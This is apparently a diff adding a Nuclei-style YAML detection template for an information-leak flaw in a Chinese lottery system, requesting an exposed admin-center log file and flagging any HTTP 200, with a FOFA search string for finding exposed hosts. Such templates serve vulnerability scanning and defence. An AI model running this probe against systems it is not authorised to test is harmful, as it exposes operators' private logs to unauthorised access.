@@ -1,0 +1,21 @@
+id: poc-gb9yb0rq9e2r6n1l
+info:
+  name: CP-957娱乐大富彩票系统Log存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gb9yb0rq9e2r6n1l'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gb9yb0rq9e2r6n1l
+    fofa: '"/Agent.index.do"'
+http:
+- raw:
+  - 'GET /Runtime/Logs/Admincenter/24_06_21.log HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
